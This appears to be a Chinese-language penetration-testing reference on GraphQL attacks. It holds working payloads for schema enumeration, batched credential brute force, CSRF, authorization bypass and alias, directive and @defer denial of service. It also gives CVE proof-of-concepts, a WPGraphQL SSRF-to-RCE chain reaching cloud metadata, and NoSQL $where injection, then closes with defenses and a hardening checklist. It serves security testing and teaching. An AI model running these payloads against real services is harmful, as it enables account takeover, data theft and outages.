# GraphQL Attacks — GraphQL 攻击全矩阵

> 关联文档：[JWT](../JWT/README.md) · [JSON/XML/YAML Hacking](../JSON%20XML%20YAML%20Hacking/README.md) · [NoSQL Injection](../../Search/NoSQL%20Injection/README.md) · [Rate Limit Bypass](../../Bypasses/Rate%20Limit%20Bypass/README.md) · [CSRF](../../../pentesting-web/csrf-cross-site-request-forgery.md) · [XS-Search](../../../pentesting-web/xs-search/index.html)

---

| 属性 | 值 |
|------|-----|
| **attack_surface** | 信息泄露 · 认证/授权绕过 · 配置缺陷 · 注入类 · 客户端利用 |
| **impact** | 机密性破坏 · 完整性破坏 · 可用性破坏 · 身份伪造 · 权限提升 · 远程代码执行 · 信息泄露 |
| **risk_level** | 高 |
| **prerequisites** | HTTP/1.1 协议理解 · GraphQL 查询语法基础 · Burp Suite 或同类代理工具 |
| **related_techniques** | `csrf` · `xs-search` · `nosql-injection` · `rate-limit-bypass` · `jwt-attacks` · `websocket-attacks` · `waf-bypass` |
| **difficulty** | 中级 |
| **tools** | `graphw00f` · `clairvoyance` · `inql` · `graphql-cop` · `GraphQLmap` |

---

# 0x01 原理与攻击面

## 1.1 GraphQL 安全模型缺陷

GraphQL 是一种 API 查询语言，允许客户端精确指定所需数据字段，通过**单一端点**（通常为 `/graphql`）完成所有数据操作。与 REST 的多端点模型不同，GraphQL 的安全边界发生了根本性位移：

| 维度 | REST | GraphQL |
|------|------|---------|
| 端点数量 | 每个资源一个端点 | 单一端点 |
| 认证点 | 每个端点可独立控制 | **端点级无内置认证** |
| 授权粒度 | URL 路径可见 | 隐藏在 resolver 内部 |
| 数据暴露面 | 每个端点固定返回结构 | **客户端定义返回结构** |
| 速率限制 | 按 URL 路径限速 | 单一端点所有操作共享 |
| 查询复杂度 | 固定（后端控制） | **可变（客户端控制）** |

核心安全问题源于三个设计特性：

1. **无内置认证机制** — GraphQL 规范不含认证/授权，完全依赖开发者自行实现。生产环境中常见端点完全不设防。
2. **Introspection 默认开启** — 自文档化特性暴露完整数据模型（类型、字段、参数、关系），相当于自动生成 API 文档供攻击者查阅。
3. **查询灵活性 = 攻击面扩展** — 客户端可构造任意深度、任意关联的查询，后端难以预判资源消耗上限。

## 1.2 攻击面全景

```
GraphQL 攻击面
├── 发现层 (Discovery)
│   ├── 端点爆破 (/graphql, /graphiql, /api, /graphql/console...)
│   ├── 引擎指纹识别 (graphw00f, error-based)
│   └── 通用查询验证 (query{__typename})
├── 枚举层 (Enumeration)
│   ├── Introspection 全量 Schema 提取
│   ├── 错误信息泄露 (字段不存在/类型错误)
│   ├── 无 Introspection 场景绕过 (clairvoyance/InQL/WebSocket)
│   └── JS 源码搜索 (file:* query / file:* mutation)
├── 利用层 (Exploitation)
│   ├── 数据提取 (查询/搜索/Mutation 返回值)
│   ├── 认证绕过 (批量暴力破解/CSRF/链式查询)
│   ├── 授权绕过 (变量篡改/IDOR)
│   ├── 速率限制绕过 (Aliases 批量操作)
│   ├── 拒绝服务 (Alias/Directive/Field/Array/@defer)
│   └── 注入联动 (NoSQL 注入/WAF 绕过)
└── 已知漏洞层 (Known CVEs)
    ├── CVE-2024-47614 — async-graphql 指令过载
    ├── CVE-2024-40094 — graphql-java 深度绕过
    └── CVE-2023-23684 — WPGraphQL SSRF→RCE
```

---

# 0x02 发现与指纹识别

## 2.1 端点发现

GraphQL 端点路径无强制标准，以下为实战高频路径字典：

```
/graphql
/graphiql
/graphql.php
/graphql/console
/api
/api/graphql
/graphql/api
/graphql/graphql
/v1/graphql
/v2/graphql
/query
/gql
```

同时检查 HTTP 响应头中的 `X-GraphQL-` 前缀自定义头及响应体中的 `"errors"` JSON 模式。

## 2.2 引擎指纹识别

不同 GraphQL 引擎对相同输入的错误响应不同，可据此识别后端实现。

**工具：graphw00f**

```bash
python3 graphw00f.py -t https://target.com/graphql
```

**手动指纹示例** — 发送故意无效的指令查询：

```graphql
query @deprecated {
    __typename
}
```

| 引擎 | 响应特征 |
|------|---------|
| Apollo Server | `Directive "@deprecated" may not be used on QUERY.` |
| GraphQL Ruby | `'@deprecated' can't be applied to queries` |
| Graphene (Python) | `Unknown directive "deprecated"` |
| Hot Chocolate (.NET) | `Directive 'deprecated' is not supported` |

引擎识别后，对照 [GraphQL Threat Matrix](https://github.com/nicholasaleks/graphql-threat-matrix) 判断该引擎的已知弱点（默认 introspection 行为、深度限制、CSRF 缺口、文件上传支持等）。

## 2.3 通用查询验证

**检测端点是否为 GraphQL 服务**：

```graphql
query{__typename}
```

预期响应（确认 GraphQL 端点）：

```json
{"data": {"__typename": "Query"}}
```

---

# 0x03 Schema 枚举与信息泄露

## 3.1 Introspection 全量提取

### 3.1.1 快速枚举 — 获取所有类型名和字段名

```graphql
query={__schema{types{name,fields{name}}}}
```

### 3.1.2 深度枚举 — 包含参数类型签名

```graphql
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```

此查询返回每个类型的字段、每个字段的参数、以及每个参数的类型（包括嵌套泛型如 `[String!]!`），是构造有效查询的蓝图。

### 3.1.3 全量 Introspection 查询（标准格式）

```graphql
query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types { ...FullType }
        directives {
            name
            description
            args { ...InputValue }
            onOperation   # ← 常需删除此行才能执行
            onFragment    # ← 常需删除此行才能执行
            onField       # ← 常需删除此行才能执行
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args { ...InputValue }
        type { ...TypeRef }
        isDeprecated
        deprecationReason
    }
    inputFields { ...InputValue }
    interfaces { ...TypeRef }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType { kind name }
                        }
                    }
                }
            }
        }
    }
}
```

> 注意：`onOperation`、`onFragment`、`onField` 三个指令字段在某些 GraphQL 版本中不支持，若查询报错则删除这三行后重试。

**内联 URL 编码版本（用于 GET 请求）**：

```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```

### 3.1.4 可视化 Schema

Introspection 启用时，可使用 [GraphQL Voyager](https://github.com/APIs-guru/graphql-voyager) 以交互式图形方式浏览完整 Schema 关系。

## 3.2 错误信息利用

GraphQL 的错误响应通常暴露未在文档中列出的内部信息。

**探测错误响应模式**：

```graphql
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

从错误响应中可提取：
- 字段是否存在的布尔信息（字段存在返回数据 vs 返回 "Cannot query field"）
- 参数的类型约束（"Expected type Int" 暴露参数签名）
- 后端引擎类型与版本（错误消息格式因引擎而异）

## 3.3 无 Introspection 场景绕过

生产环境越来越多地禁用 introspection。以下方法可绕过此限制：

### 3.3.1 Introspection 关键字绕过

开发者通常用正则表达式屏蔽 `__schema` 关键字。GraphQL 忽略空白字符（空格、换行、逗号），但正则可能不覆盖：

```json
{
    "query": "query{__schema\n{queryType{name}}}"
}
```

在 `__schema` 后插入换行符、空格或逗号可能绕过简单的关键词匹配。

若失败，尝试变更请求方法——限制可能仅对 POST 请求生效，GET 请求或 `x-www-form-urlencoded` POST 可能不受限制。

### 3.3.2 clairvoyance — 基于建议的 Schema 重建

即使 introspection 禁用，部分 GraphQL 引擎在遇到未知字段时返回建议（"Did you mean X?"）。[clairvoyance](https://github.com/nikitastupin/clairvoyance) 利用这些建议反向重建 schema：

```bash
clairvoyance -o schema.json https://target.com/graphql
```

### 3.3.3 GraphQuail — Burp Suite 被动 Schema 构建

[GraphQuail](https://github.com/forcesunseen/graphquail) 作为 Burp Suite 扩展，观察流经 Burp 的 GraphQL 请求，累积构建内部 schema。它拦截 introspection 查询并返回虚假响应，使 GraphiQL/Voyager 可基于已观察到的查询显示可用字段。

### 3.3.4 WebSocket 通道绕过 WAF

如 [此演讲](https://www.youtube.com/watch?v=tIo_t5uUK50) 所述，通过 WebSocket 连接到 GraphQL 可绕过基于 HTTP 的 WAF：

```javascript
ws = new WebSocket("wss://target/graphql", "graphql-ws")
ws.onopen = function start(event) {
  var GQL_CALL = {
    extensions: {},
    query: `
        {
            __schema {
                _types { name }
            }
        }`,
  }
  var graphqlMsg = {
    type: "GQL.START",
    id: "1",
    payload: GQL_CALL,
  }
  ws.send(JSON.stringify(graphqlMsg))
}
```

### 3.3.5 JS 源码搜索预加载查询

使用浏览器开发者工具的 `Sources` → "Search all files" 功能搜索：

```
file:* mutation
file:* query
```

前端 JavaScript 库中常包含预加载的 GraphQL 查询/变更，直接暴露 API 结构和敏感操作。

### 3.3.6 实体发现字典

使用 [graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist) 暴力破解常见字段名和类型名。

## 3.4 Error-based Schema 重建（InQL v6.1+）

InQL v6.1+ 引入基于错误反馈的 schema 暴力破解器，通过批量发送候选字段/参数名并根据错误特征重建 schema：

- `Field 'bugs' not found on type 'inql'` — 确认父类型存在，排除无效字段名
- `Argument 'contribution' is required` — 暴露必需参数及其拼写
- `Did you mean 'openPR'?` — 反馈回队列作为已验证候选
- **类型不匹配** — 故意发送错误基本类型（如字符串代替整数）触发类型签名泄露，包括 `[Episode!]` 等列表/对象包装类型

暴力破解器对任何产生新字段的类型递归，通过混合通用 GraphQL 名称与应用特定词汇逐步映射出大部分 schema。

### 自动变量生成

当操作需要 `variables` JSON 时，InQL 自动注入合理默认值以通过首次 schema 验证：

```
"String"  → "exampleString"
"Int"     → 42
"Float"   → 3.14
"Boolean" → true
"ID"      → "123"
ENUM      → 第一个声明值
```

嵌套输入对象继承相同映射，可立即获得可用于 SQLi/NoSQLi/SSRF/逻辑绕过模糊测试的载荷。

---

# 0x04 查询与变更利用

## 4.1 数据提取技术

### 4.1.1 识别可查询根对象

Introspection 结果中，`queryType` 指向根查询对象（通常名为 `Query`）。只有该对象上的字段可直接查询——schema 中定义的其他类型需通过根查询的字段关联访问。

示例：根查询对象 `Query` 包含字段 `flags`（类型为 `Flags`），则可通过以下查询访问：

```graphql
query={flags{name, value}}
```

### 4.1.2 原始类型直接查询

若字段类型为原始类型（String、Int 等），无需指定子字段：

```graphql
query={hiddenFlags}
```

### 4.1.3 参数化查询与错误辅助枚举

当查询需要参数时，可通过错误信息反推参数名和类型：

**步骤 1** — 发送无参数请求获取参数名和类型：

```graphql
# 通过 introspection 查询获知所有参数
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```

**步骤 2** — 暴力破解参数值：

```graphql
query={user(uid:1){user,password}}
```

**步骤 3** — 通过请求不存在字段的错误信息发现真实字段名：

```graphql
query={user(uid:1){noExists}}
# 错误响应: "Cannot query field 'noExists' on type 'dbuser'"
# 暗示真实类型为 'dbuser'，进而可在 schema 中查找该类型的实际字段
```

### 4.1.4 空字符串全量转储

当可按字符串字段搜索时，搜索空字符串可能返回所有记录：

```graphql
query={theusers(description: ""){username,password}}
```

## 4.2 搜索与关联查询

典型场景：数据库包含 `persons` 和 `movies`，person 可通过 `email` 和 `name` 标识，movies 通过 `name` 和 `rating` 标识。Person 之间可建立好友关系，person 与 movie 之间存在订阅关系。

**按名称搜索 person 获取 email**：

```graphql
{
  searchPerson(name: "John Doe") {
    email
  }
}
```

**搜索 person 并获取其关联电影**：

```graphql
{
  searchPerson(name: "John Doe") {
    email
    subscribedMovies {
      edges {
        node {
          name
        }
      }
    }
  }
}
```

**同时搜索多个对象**：

```graphql
{
  searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
    name
  }
}
```

**使用别名同时查询多个不同对象**：

```graphql
{
  johnsMovieList: searchPerson(name: "John Doe") {
    subscribedMovies {
      edges {
        node {
          name
        }
      }
    }
  }
  davidsMovieList: searchPerson(name: "David Smith") {
    subscribedMovies {
      edges {
        node {
          name
        }
      }
    }
  }
}
```

## 4.3 Mutation 滥用

Mututation 用于服务端数据变更。Introspection 结果中 `mutationType` 指向变更根对象，其字段即为所有可用变更操作。

**创建资源示例**：

```graphql
mutation {
  addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
    movies {
      name
      rating
    }
  }
}
```

**关联创建** — 同时创建实体并关联已有数据。关联对象（friends、movies）必须在数据库中预先存在：

```graphql
mutation {
  addPerson(
    name: "James Yoe",
    email: "jy@example.com",
    friends: [{name: "John Doe"}, {email: "jd@example.com"}],
    subscribedMovies: [
      {name: "Rocky"},
      {name: "Interstellar"},
      {name: "Harry Potter and the Sorcerer's Stone"}
    ]
  ) {
    person {
      name
      email
      friends {
        edges {
          node { name email }
        }
      }
      subscribedMovies {
        edges {
          node { name rating releaseYear }
        }
      }
    }
  }
}
```

> 注意：Mutation 请求中值和数据类型均在查询体内显式声明。攻击者可利用此特性尝试类型混淆或注入。

---

# 0x05 认证与授权攻击

## 5.1 批量凭证暴力破解（Batching Brute-force）

GraphQL 支持在单个 HTTP 请求中批量发送多个查询。攻击者可利用此特性在一个请求中携带数千组不同凭证，绕过基于 HTTP 请求数量的外部速率限制：

**单个请求携带 3 组凭证示例**：

```graphql
mutation {
  login1: login(email: "user1@example.com", password: "pass1") { token }
  login2: login(email: "user2@example.com", password: "pass2") { token }
  login3: login(email: "admin@example.com", password: "admin123") { token }
}
```

响应中每个别名返回独立结果，正确凭证的返回值与非正确凭证的 `null` 明确区分。此技术可在一个 HTTP 请求中携带数千组凭证，使外部速率监控完全失效。

> 攻击来源: [Wallarm — GraphQL Batching Attack](https://lab.wallarm.com/graphql-batching-attack/)

## 5.2 CSRF 攻击

GraphQL 端点通常通过 POST + `application/json` 通信：

```json
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```

但大多数 GraphQL 端点也支持 **`application/x-www-form-urlencoded` POST 请求**：

```
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```

form-urlencoded POST 不触发 CORS preflight 请求，因此可在缺乏 CSRF Token 的 GraphQL 端点上执行 CSRF 攻击。

**绕过注意事项**：

- GraphQL 通常也支持 GET 请求发送查询，而 CSRF Token 可能不对 GET 请求验证
- Chrome 的 `SameSite=Lax` 默认值限制第三方网站在 POST 请求中发送 Cookie，但 GET 请求不受此限制
- 结合 [XS-Search](../../../pentesting-web/xs-search/index.html) 可通过 CSRF 嗅探 GraphQL 端点数据

> 参考: [Doyensec — GraphQL CSRF](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)

## 5.3 授权绕过

许多 GraphQL 端点的 resolver 仅检查认证状态而忽略授权检查。攻击者修改查询变量即可访问其他用户的数据：

```json
{
  "operationName":"updateProfile",
  "variables":{"username":"INJECT","data":"INJECT"},
  "query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```

水平越权常见模式：
- 修改 `username`/`userId`/`email` 等标识变量访问他人数据
- 修改 Mutation 的 `id` 参数操作不属于当前用户的资源

## 5.4 链式查询认证绕过

通过在预期操作后追加额外查询/变更，可绕过弱认证系统。如以下示例：操作声明为 "forgotPassword"，但攻击者追加了 "register" 变更，系统同时执行了两个操作：

[认证绕过链式查询图 — 源: GraphQLAuthBypassMethod.PNG]
- 操作 "forgotPassword" 仅应执行密码重置
- 攻击者在同一请求中追加 "register" 查询 + 新用户变量
- 弱认证系统未验证操作范围，同时注册新用户

> 来源: [TheB10g — GraphQL Query Authentication Bypass](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln)

## 5.5 Cross-Site WebSocket Hijacking

与 GraphQL CSRF 类似，若 GraphQL WebSocket 端点依赖未受保护的 Cookie 进行认证，攻击者可通过跨站 WebSocket 劫持使用受害者凭证执行未授权操作。

> 关联文档：[WebSocket Attacks](../../../pentesting-web/websocket-attacks.md)

---

# 0x06 速率限制绕过

## 6.1 GraphQL Aliases 批量操作

GraphQL 别名允许在同一请求中为同类型对象的多个实例显式命名。这一特性原本用于减少 API 调用次数，但可被滥用于暴力破解等场景——基于 HTTP 请求数的速率限制器将整个 aliased 请求计为一次操作：

```graphql
query isValidDiscount($code: Int) {
    isvalidDiscount(code:$code){ valid }
    isValidDiscount2:isValidDiscount(code:$code){ valid }
    isValidDiscount3:isValidDiscount(code:$code){ valid }
}
```

此请求包含 3 次逻辑上的折扣码验证，但速率限制器仅将其计为 1 次 HTTP 请求。在单个请求中可扩展至数千个别名。

**注意限制**：
- 部分 GraphQL 实现将别名批量操作合并为单一数据库事务——若限制器部署在应用层而非 GraphQL 层，此技术可能无效
- 响应体大小随别名数量线性增长，可能触发响应大小限制

> 此技术同样适用于 REST batch 端点和滑动窗口限制绕过。详细分析见 [Rate Limit Bypass](../../Bypasses/Rate%20Limit%20Bypass/README.md)。

---

# 0x07 拒绝服务攻击

## 7.1 Alias Overloading

通过为同一字段创建大量别名，迫使后端 resolver 重复执行该字段的计算逻辑：

```bash
curl -X POST -H "Content-Type: application/json" \
    -d '{"query": "{ alias0:__typename \nalias1:__typename \n... (重复至 alias100+) }"}' \
    'https://example.com/graphql'
```

每个别名对应一次独立的 resolver 调用。若后端字段涉及数据库查询或复杂计算，1000 个别名 = 1000 次查询。

**缓解**：限制每个请求的别名数量上限；实施查询复杂度分析。

## 7.2 Array-based Query Batching

若 GraphQL 端点支持数组格式批量查询（一个 HTTP 请求包含多个独立查询），攻击者可在一个请求中提交大量查询并行执行：

```bash
curl -X POST -H "Content-Type: application/json" \
    -d '[{"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, ... (重复 N 次)]' \
    'https://example.com/graphql'
```

服务器同时执行所有批量查询，消耗 CPU、内存和数据库连接。

**缓解**：限制每批次查询数量；禁用数组批量查询支持。

## 7.3 Directive Overloading

### 7.3.1 自定义指令过载

```bash
curl -X POST -H "Content-Type: application/json" \
    -d '{"query": "query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }"}' \
    'https://example.com/graphql'
```

`@aa` 可能未被声明，但重复指令的处理逻辑本身消耗解析资源。

### 7.3.2 内置指令过载（`@include`）

使用普遍存在的内置指令 `@include` 更可靠：

```bash
curl -X POST -H "Content-Type: application/json" \
    -d '{"query": "query cop { __typename @include(if: true) @include(if: true) @include(if: true) ... }"}' \
    'https://example.com/graphql'
```

### 7.3.3 枚举已有指令 — 精准打击

先通过 introspection 枚举所有已声明的指令：

```graphql
{ __schema { directives { name locations args { name type { name kind ofType { name } } } } } }
```

随后使用找到的自定义指令构造过载攻击，针对性更强。

### 7.3.4 async-graphql 指数级展开（CVE-2024-47614）

在 `async-graphql`（Rust）中，重复指令被展开为指数级执行节点，单个请求即可耗尽 CPU/内存。详见 8.1。

**缓解**：限制每字段指令数量；过滤 `"@include.*@include.*@include"` 等重复指令模式。

## 7.4 Field Duplication

同一字段在查询中反复出现，迫使后端解析器为每次出现重新计算：

```bash
curl -X POST -H "Content-Type: application/json" \
    -d '{"query": "query cop { __typename \n__typename \n... (重复 N 次) }"}' \
    'https://example.com/graphql'
```

每个重复的 `__typename` 触发一次独立的字段解析。扩展到数百次时可能导致 CPU 耗尽。

**缓解**：实施字段去重/频率检查；限制最大字段数。

## 7.5 Incremental Delivery Abuse（`@defer` / `@stream`）

自 2023 年起主流 GraphQL 服务器（Apollo Server 4、graphql-java 20+、Hot Chocolate 13）实现了 `@defer` 和 `@stream` 增量交付指令。每个延迟片段作为独立的 HTTP 分块（chunk）发送，总响应大小变为 N+1（信封 + patches）。

攻击者可在单次请求中声明数千个 `@defer` 字段，产生巨大的放大响应，同时绕过仅检查首个 chunk 的 WAF 体大小限制：

```graphql
query abuse {
  f0: __typename @defer
  f1: __typename @defer
  ... (重复 2000 次)
}
```

**缓解**：生产环境禁用 `@defer/@stream`；或强制设定 `max_patches`、累积 `max_bytes` 和执行超时。`graphql-armor` 等库已内置合理默认值。

---

# 0x08 已知漏洞（CVE 2023-2025）

## 8.1 CVE-2024-47614 — async-graphql 指令过载 DoS

| 属性 | 值 |
|------|-----|
| **影响库** | async-graphql（Rust）< 7.0.10 |
| **根因** | 重复指令无数量限制，展开为指数级执行节点 |
| **影响** | 单请求耗尽 CPU/RAM，导致服务崩溃 |
| **利用条件** | 无需认证，远程触发 |

```graphql
# PoC — @include 重复 X 次
query overload {
  __typename @include(if:true) @include(if:true) @include(if:true)
}
```

**修复**：升级至 ≥ 7.0.10 或调用 `SchemaBuilder.limit_directives()`；WAF 规则阻断 `"@include.*@include.*@include"` 模式。

## 8.2 CVE-2024-40094 — graphql-java 深度/复杂度限制绕过

| 属性 | 值 |
|------|-----|
| **影响库** | graphql-java < 19.11, 20.0-20.8, 21.0-21.4 |
| **根因** | `MaxQueryDepth` / `MaxQueryComplexity` 检测未考虑 `ExecutableNormalizedFields`，递归片段完全绕过限制 |
| **影响** | 未经认证的 DoS，影响 Spring Boot / Netflix DGS / Atlassian 等 Java 技术栈 |
| **利用条件** | 无需认证，远程触发 |

```graphql
fragment A on Query { ...B }
fragment B on Query { ...A }
query { ...A }
```

**修复**：升级 graphql-java 至修复版本。

## 8.3 CVE-2023-23684 — WPGraphQL SSRF → RCE 链

| 属性 | 值 |
|------|-----|
| **影响库** | WPGraphQL ≤ 1.14.5（WordPress 插件） |
| **根因** | `createMediaItem` mutation 接受攻击者控制的 `filePath` URL，允许内网访问和文件写入 |
| **影响** | 认证的 Editor/Author 可访问云 metadata 端点或写入 PHP 文件实现 RCE |
| **利用条件** | 需要 Editor 或 Author 级别 WordPress 权限 |

**攻击链**：`createMediaItem(filePath: "http://169.254.169.254/latest/meta-data/")` → 内网 metadata 泄露 → `createMediaItem(filePath: "data://...PHP payload...")` → PHP 文件写入 → RCE。

**修复**：升级 WPGraphQL 至 > 1.14.5。

---

# 0x09 跨领域攻击链

## 9.1 GraphQL → NoSQL Injection（Mongo 过滤器混淆）

GraphQL resolver 将 `args.filter` 直接转发给 `collection.find()` 的场景可能导致 Mongo 过滤器注入。攻击者利用 GraphQL 输入类型绕过预期的键值对过滤，注入 Mongo 操作符：

```graphql
query {
  users(filter: {
    "$where": "this.password.length > 0"
  }) {
    username
  }
}
```

若后端直接将 GraphQL 输入对象展开为 Mongo filter（如 `collection.find(args.filter)`），`$where`、`$regex`、`$ne` 等操作符均可注入，导致：
- 绕过认证（`{"$ne": ""}` 匹配非空密码的所有用户）
- 盲注提取（通过 `$regex` 逐字符猜解字段值）
- 数据全量导出（`$where` 执行任意 JavaScript）

**防御**：对 GraphQL 输入类型实施白名单字段映射；禁止将未消毒对象直接展开到 Mongo/Mongoose filter。

> 完整 NoSQL 注入技术链见 [NoSQL Injection](../../Search/NoSQL%20Injection/README.md)。

## 9.2 Multipart/Form-data WAF 绕过联动

基于 multipart/form-data 换行符差异的通用 WAF 绕过技术同样适用于 GraphQL multipart 请求（文件上传 mutation）。当 GraphQL 端点支持 multipart 规范时，可通过构造特殊换行符边界实现 WAF 绕过。

## 9.3 XS-Search 数据窃取联动

GraphQL 端点通常返回确定性响应（查询存在返回数据，不存在返回 null），这使得它成为 XS-Search 攻击的理想目标。攻击者通过 CSRF 强迫受害者浏览器发起 GraphQL 查询，并按时间差或响应大小差异（通过 `window.open` + `location.hash` 或其他侧信道）推断查询结果。

**攻击链**：CSRF 发起 GraphQL 查询 → 跨域侧信道读取响应差异 → 逐位推断敏感数据（如 email、token、用户 ID）。

> 关联文档：[XS-Search](../../../pentesting-web/xs-search/index.html)

---

# 0x0A 检测与防御

## 10.1 安全测试方法论

### 10.1.1 测试检查清单

**发现**：
- [ ] 爆破 GraphQL 端点路径（/graphql, /graphiql, /api, /gql...）
- [ ] 发送 `query{__typename}` 验证端点类型
- [ ] 运行 graphw00f 识别引擎及版本

**枚举**：
- [ ] 执行全量 Introspection 查询
- [ ] 尝试 GET/POST/x-www-form-urlencoded/WebSocket 四种方法绕过 introspection 禁用
- [ ] 使用 clairvoyance 从错误建议重建 schema
- [ ] 搜索 JS 源码中的预加载 query/mutation（`file:* mutation` / `file:* query`）
- [ ] 检查错误消息中的信息泄露（字段提示、类型签名）

**利用**：
- [ ] 测试批量查询暴力破解（Batching Brute-force — 多组凭证单请求）
- [ ] 测试 CSRF（form-urlencoded POST 或 GET 发送状态变更操作）
- [ ] 测试授权绕过（修改查询变量中的用户标识）
- [ ] 测试链式查询认证绕过（在预期操作后追加额外 query/mutation）
- [ ] 测试别名批量操作绕过速率限制
- [ ] 测试 Alias Overloading DoS（100+ 别名）
- [ ] 测试 Array Batching DoS（数组格式 10+ 查询）
- [ ] 测试 Directive Overloading（内置 `@include` 或自定义指令重复）
- [ ] 测试 Field Duplication DoS（重复字段 100+ 次）
- [ ] 指纹引擎后对照 GraphQL Threat Matrix 检查已知弱点

**注入联动**：
- [ ] 若 resolver 直接转发参数到数据库，测试 SQL/NoSQL 注入
- [ ] 若存在文件上传 mutation，测试 multipart WAF 绕过
- [ ] 检查 mutation 参数中的 SSRF 可能性（URL 类型输入）

### 10.1.2 GraphQL 的 HTTP 方法兼容性矩阵

| 方法 | Content-Type | CSRF Preflight | Typical Support |
|------|-------------|----------------|-----------------|
| POST | `application/json` | 是（非简单请求） | 广泛支持 |
| POST | `application/x-www-form-urlencoded` | 否 | 多数支持 |
| GET | URL query string | 否 | 多数支持 |
| WebSocket | `graphql-ws` | N/A | 部分支持 |

> 安全建议：仅允许 `application/json` Content-Type 的 POST 请求，强制 CSRF 保护生效。

## 10.2 防御中间件

### 10.2.1 graphql-armor

Escape Tech 发布的 Node/TypeScript 验证中间件，为 Apollo Server、GraphQL Yoga/Envelop、Helix 等提供即插即用的查询深度/别名/字段/指令/令牌/成本限制。

```ts
import { protect } from '@escape.tech/graphql-armor';
import { applyMiddleware } from 'graphql-middleware';

const protectedSchema = applyMiddleware(schema, ...protect());
```

`graphql-armor` 自动阻断过度深层、过高复杂度或包含过量指令的查询，可防御上述 CVE 及 DoS 变体。

### 10.2.2 GraphQL Threat Matrix

[GraphQL Threat Matrix](https://github.com/nicholasaleks/graphql-threat-matrix) 按引擎分类的已知弱点矩阵，对照引擎指纹结果可快速定位针对性攻击路径。

## 10.3 加固清单

| 维度 | 措施 |
|------|------|
| **Introspection** | 生产环境禁用；若需保留，限制为仅认证用户访问 |
| **认证** | 端点级强制认证；不接受未认证请求 |
| **授权** | 每个 resolver 实施字段级/记录级授权；不依赖 GraphQL 层做访问控制 |
| **速率限制** | 基于查询成本（cost analysis）而非 HTTP 请求数；单个操作独立计数 |
| **查询深度** | 实施最大查询深度（建议 ≤ 10）和最大节点数/复杂度限制 |
| **别名限制** | 限制单请求别名数量（建议 ≤ 20） |
| **批量查询** | 禁用数组格式批量查询；或限制每批次 ≤ 3 个查询 |
| **指令限制** | 限制单字段最大指令数（建议 ≤ 5） |
| **`@defer/@stream`** | 生产环境禁用，或实施 max_patches + max_bytes 上限 |
| **CSRF** | 仅允许 `application/json` POST；实施 CSRF Token 验证 |
| **错误信息** | 生产环境禁用详细错误消息；返回通用错误格式 |
| **HTTP 方法** | 仅允许 POST + `application/json`；禁止 GET 查询 |
| **CORS** | 严格限制 Access-Control-Allow-Origin |
